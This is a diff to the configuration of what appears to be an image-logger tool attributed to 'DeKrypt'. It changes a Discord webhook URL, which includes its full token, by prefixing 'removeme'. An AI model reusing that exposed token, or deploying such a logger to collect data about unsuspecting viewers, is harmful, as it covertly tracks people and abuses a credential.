@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1330982655722000435/_ZhFTuLKSuM9snwtMHBXceNcPHjmquhHM556GjWvpp1lUtFuna5md2rQid_ZqCiyu98o",
+    "webhook": "removemehttps://discord.com/api/webhooks/1330982655722000435/_ZhFTuLKSuM9snwtMHBXceNcPHjmquhHM556GjWvpp1lUtFuna5md2rQid_ZqCiyu98o",
     "image": "https://getwallpapers.com/wallpaper/full/1/e/4/890298-full-size-shrek-wallpapers-2560x1440.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
